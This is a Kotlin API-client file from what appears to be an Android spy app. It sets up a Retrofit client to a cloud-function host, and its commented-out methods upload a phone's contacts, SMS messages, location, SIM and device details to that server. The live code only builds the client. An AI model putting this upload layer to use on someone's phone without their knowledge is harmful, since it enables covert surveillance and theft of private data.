package com.komnacki.androidspyapp.api

import com.google.gson.GsonBuilder
import io.reactivex.schedulers.Schedulers
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory
import retrofit2.converter.gson.GsonConverterFactory


class PermissionsService {
    companion object {
        val TAG : String = "KK: SERVICE"

        val BASE_URL : String = "https://us-central1-permissionraport.cloudfunctions.net"
        var rxAdapter : RxJava2CallAdapterFactory = RxJava2CallAdapterFactory.createWithScheduler(Schedulers.io())
        var gson = GsonBuilder()
            .setLenient()
            .create()
        var interceptor : HttpLoggingInterceptor = HttpLoggingInterceptor()
            .setLevel(HttpLoggingInterceptor.Level.HEADERS)
        var client : OkHttpClient = OkHttpClient.Builder().addInterceptor(interceptor).build()
        var retrofit : Retrofit = Retrofit.Builder()
            .baseUrl(BASE_URL)
            .client(client)
            .addConverterFactory(GsonConverterFactory.create(gson))
            .addCallAdapterFactory(rxAdapter)
            .build()
        val api : PermissionsApi = retrofit.create(
            PermissionsApi::class.java)
    }


//    fun getContacts(email : String) : Observable<ContactsPOJO> {
//        return api.getContacts(email)
//    }
//
//    fun sendConnectedEmails(email : String, easyIdsPOJO : EasyIdsPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendConnectedEmails: $easyIdsPOJO")
//        return api.sendConnectedEmails(email, easyIdsPOJO)
//    }

//    fun sendBatteryState(email : String, easyBatteryPOJO : EasyBatteryPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendBatteryState: $easyBatteryPOJO")
//        return api.sendBatteryState(email, easyBatteryPOJO)
//    }

//    fun sendContacts(email : String, contactsPOJO : ContactsPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendContacts: $contactsPOJO")
//        return api.sendContacts(email, contactsPOJO)
//    }
//
//    fun sendMessages(email : String, messagesPOJO : MessagesPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendMessages: $messagesPOJO")
//        return api.sendMessages(email, messagesPOJO)
//    }
//
//    fun sendRaport(email : String) : Observable<ApiResponse> {
//        Log.d(TAG, "sendRaport")
//        return api.sendRaport(email)
//    }
//
//    fun sendSensorsInfo(email : String, sensorsInfo : EasySensorsPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendSensorsInfo: $sensorsInfo")
//        return api.sendSensorsInfo(email, sensorsInfo)
//    }
//
//    fun sendConfig(email : String, config : EasyConfigPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendConfig: $config")
//        return api.sendConfig(email, config)
//    }
//
//    fun sendNetworkInfo(email : String, networkInfo : EasyNetworkPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendNetworkInfo: $networkInfo")
//        return api.sendNetworkInfo(email, networkInfo)
//    }
//
//    fun sendMemoryInfo(email : String, memoryInfo : EasyMemoryPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendMemoryInfo: $memoryInfo")
//        return api.sendMemoryInfo(email, memoryInfo)
//    }
//
//    fun sendBluetoothInfo(email : String, bluetoothPOJO : EasyBluetoothPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendBluetoothInfo:  $bluetoothPOJO")
//        return api.sendBluetoothInfo(email, bluetoothPOJO)
//    }
//
//    fun sendDeviceInfo(email : String, devicePOJO : EasyDevicePOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendDeviceInfo: $devicePOJO")
//        return api.sendDeviceInfo(email, devicePOJO)
//    }
//
//    fun sendSimInfo(email : String, simInfo : EasySimPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendSimInfo: $simInfo")
//        return api.sendSimInfo(email, simInfo)
//    }
//
//    fun sendLocationInfo(email : String, locationInfo : EasyLocationPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendLocationInfo: $locationInfo")
//        return api.sendLocationInfo(email, locationInfo)
//    }
//
//    fun sendNFCInfo(email : String, easyNFCPojo : EasyNFCPOJO) : Observable<ApiResponse> {
//        Log.d(TAG, "sendNFCInfo: $easyNFCPojo")
//        return api.sendNFCInfo(email, easyNFCPojo)
//    }

}